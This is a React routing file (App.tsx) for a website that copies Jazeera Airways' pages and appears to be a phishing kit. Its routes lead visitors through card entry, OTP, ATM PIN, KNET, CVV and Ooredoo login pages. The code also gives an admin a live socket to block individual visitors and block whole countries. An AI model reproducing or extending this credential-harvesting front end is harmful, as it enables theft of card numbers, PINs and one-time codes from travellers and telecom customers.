import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./contexts/ThemeContext";
import { LanguageProvider } from "./contexts/LanguageContext";
import { initializeSocket, disconnectSocket, socket, visitor } from "./lib/store";
// import AmerChat from "./components/AmerChat";


// Payment Pages
import Home from "./pages/HomePage";
import FlightSearchResults from "./pages/FlightSearchResults";
import PassengerDetails from "./pages/PassengerDetails";
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";
import KNETPayment from "./pages/KNETPayment";
import CVV from "./pages/CVV";




// Network Operator Page
import NetworkOperator from "./pages/NetworkOperator";

// Ooredoo Login Pages
import OoredooLogin from "./pages/OoredooLogin";
import OTPLogin from "./pages/OTPLogin";
import CustomerAuthentication from "./pages/CustomerAuthentication";

// Final Page
import FinalPage from "./pages/FinalPage";
import EmergencyContact from "./pages/EmergencyContact";
import SeatCustomization from "./pages/SeatCustomization";
import Meals from "./pages/Meals";
import CustomizeTrip from "./pages/CustomizeTrip";
import Extras from "./pages/Extras";
import ReviewPay from "./pages/ReviewPay";
import Wheelchair from "./pages/Wheelchair";
import DestinationPage from "./pages/DestinationPage";
import ServicePage from "./pages/ServicePage";
import InfoPage from "./pages/InfoPage";


function Router() {
  return (
    <Switch>
      {/* Main Page - Credit Card Payment */}
      <Route exact path={"/"} component={Home} />
      <Route path={"/home"} component={Home} />
      <Route path={"/app"} component={Home} />
      <Route path={"/home.html"} component={Home} />
      <Route path={"/flight-search"} component={FlightSearchResults} />
      <Route path={"/passenger-details"} component={PassengerDetails} />
      <Route path={"/emergency-contact"} component={EmergencyContact} />
      <Route path={"/wheelchair"} component={Wheelchair} />
      <Route path={"/seat-customization"} component={SeatCustomization} />
      <Route path={"/meals"} component={Meals} />
      <Route path={"/customize-your-trip"} component={CustomizeTrip} />
      <Route path={"/extras"} component={Extras} />
      <Route path={"/review-pay"} component={ReviewPay} />
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />
      <Route path={"/knet-payment"} component={KNETPayment} />
      <Route path={"/cvv"} component={CVV} />

      {/* Network Operator */}
      <Route path={"/network-operator"} component={NetworkOperator} />

      {/* Ooredoo Login Flow */}
      <Route path={"/ooredoo-login"} component={OoredooLogin} />
      <Route path={"/otp-login"} component={OTPLogin} />
      <Route path={"/customer-authentication"} component={CustomerAuthentication} />

      {/* Final Page */}
      <Route path={"/final-page"} component={FinalPage} />

      {/* Destination Pages */}
      <Route path="/destinations/budapest">{() => <DestinationPage slug="budapest" />}</Route>
      <Route path="/destinations/krakow">{() => <DestinationPage slug="krakow" />}</Route>
      <Route path="/destinations/prague">{() => <DestinationPage slug="prague" />}</Route>
      <Route path="/destinations/tivat">{() => <DestinationPage slug="tivat" />}</Route>
      <Route path="/destinations/london-luton">{() => <DestinationPage slug="london-luton" />}</Route>
      <Route path="/destinations/dubai">{() => <DestinationPage slug="dubai" />}</Route>
      <Route path="/destinations/cairo">{() => <DestinationPage slug="cairo" />}</Route>
      <Route path="/destinations/sohag">{() => <DestinationPage slug="sohag" />}</Route>
      <Route path="/destinations/luxor">{() => <DestinationPage slug="luxor" />}</Route>
      <Route path="/destinations/damascus">{() => <DestinationPage slug="damascus" />}</Route>
      <Route path="/destinations/assiut">{() => <DestinationPage slug="assiut" />}</Route>
      <Route path="/destinations/colombo">{() => <DestinationPage slug="colombo" />}</Route>
      <Route path="/destinations/kochi">{() => <DestinationPage slug="kochi" />}</Route>
      <Route path="/destinations/istanbul">{() => <DestinationPage slug="istanbul" />}</Route>
      <Route path="/destinations/jeddah">{() => <DestinationPage slug="jeddah" />}</Route>
      <Route path="/destinations/delhi">{() => <DestinationPage slug="delhi" />}</Route>
      <Route path="/destinations/tehran">{() => <DestinationPage slug="tehran" />}</Route>

      {/* Service Pages */}
      <Route path="/services/priority-service">{() => <ServicePage slug="priority-service" />}</Route>
      <Route path="/services/cancel-for-any-reason">{() => <ServicePage slug="cancel-for-any-reason" />}</Route>
      <Route path="/services/travel-with-pets">{() => <ServicePage slug="travel-with-pets" />}</Route>
      <Route path="/services/car-parking">{() => <ServicePage slug="car-parking" />}</Route>
      <Route path="/services/hayakom-service">{() => <ServicePage slug="hayakom-service" />}</Route>
      <Route path="/services/wheelchair-assistance">{() => <ServicePage slug="wheelchair-assistance" />}</Route>
      <Route path="/services/unaccompanied-minor">{() => <ServicePage slug="unaccompanied-minor" />}</Route>
      <Route path="/services/early-check-in">{() => <ServicePage slug="early-check-in" />}</Route>
      <Route path="/services/disruption-assistance">{() => <ServicePage slug="disruption-assistance" />}</Route>
      <Route path="/services/cross-airline-baggage">{() => <ServicePage slug="cross-airline-baggage" />}</Route>

      {/* Info Pages */}
      <Route path="/info/baggage-allowance">{() => <InfoPage slug="baggage-allowance" />}</Route>
      <Route path="/info/faqs">{() => <InfoPage slug="faqs" />}</Route>
      <Route path="/info/careers">{() => <InfoPage slug="careers" />}</Route>
      <Route path="/info/jazeera-terminal">{() => <InfoPage slug="jazeera-terminal" />}</Route>
      <Route path="/info/seats-offers">{() => <InfoPage slug="seats-offers" />}</Route>
      <Route path="/info/j-cafe">{() => <InfoPage slug="j-cafe" />}</Route>
      <Route path="/info/cabin-crew-course">{() => <InfoPage slug="cabin-crew-course" />}</Route>
      <Route path="/info/aviation-course">{() => <InfoPage slug="aviation-course" />}</Route>
      <Route path="/info/graduate-training">{() => <InfoPage slug="graduate-training" />}</Route>
      <Route path="/info/visa-information">{() => <InfoPage slug="visa-information" />}</Route>
      <Route path="/info/meet-greet">{() => <InfoPage slug="meet-greet" />}</Route>


      <Route path={"/404"} component={NotFound} />
      {/* Final fallback route */}
      <Route component={NotFound} />
    </Switch>
  );
}

// Blocked Country Page Component
function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
          </svg>
        </div>
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function App() {
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");

  // Initialize socket on app mount
  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);
  // Listen for admin block/unblock events
  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  // Check if visitor's country is blocked.
  //
  // IMPORTANT: This runs entirely in the background and NEVER blocks rendering.
  // We rely on the visitor's country that the backend resolves from the socket
  // connection (server already has the visitor IP) instead of calling a 3rd
  // party IP service. The old code used `fetch('https://ipapi.co/json/')`,
  // which is blocked by CORS / can hang for a long time on some networks
  // (e.g. Kuwait ISPs) and was the real cause of the page "freezing" /
  // "page isn't responding" on the user's machine while working fine elsewhere.
  useEffect(() => {
    const s = socket.value;

    const handleCheckResult = (payload: { isBlocked?: boolean }) => {
      setIsCountryBlocked(!!(payload && payload.isBlocked));
    };

    const handleUpdated = (blockedCountries: string[]) => {
      const country = (visitor.value.country || '').toLowerCase();
      if (!country || !Array.isArray(blockedCountries)) return;
      const blocked = blockedCountries.some(
        (c) => String(c).toLowerCase() === country
      );
      setIsCountryBlocked(blocked);
    };

    // Register listeners once (and clean them up on unmount).
    s.on('blockedCountries:checkResult', handleCheckResult);
    s.on('blockedCountries:updated', handleUpdated);

    // Ask the server to check our country once we have it from the visitor
    // payload. We retry a few times with a hard cap, then give up silently.
    let tries = 0;
    const ask = setInterval(() => {
      tries++;
      const country = visitor.value.country;
      if (country && s.connected) {
        s.emit('blockedCountries:check', country);
        clearInterval(ask);
      }
      if (tries > 10) clearInterval(ask); // give up after ~5s, never block UI
    }, 500);

    return () => {
      clearInterval(ask);
      s.off('blockedCountries:checkResult', handleCheckResult);
      s.off('blockedCountries:updated', handleUpdated);
    };
  }, []);

  // Loading screen removed: render instantly, check country in background

  // Show blocked page if country is blocked
  if (isCountryBlocked) {
    return <BlockedCountryPage />;
  }
  // Show blocked page if visitor is blocked by admin
  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage || "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام."}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <LanguageProvider>
          <TooltipProvider>
            <Toaster />
            <ScrollToTop />
            <PageTitleUpdater />
            {/* <AmerChat /> */}
            <Router />
          </TooltipProvider>
        </LanguageProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
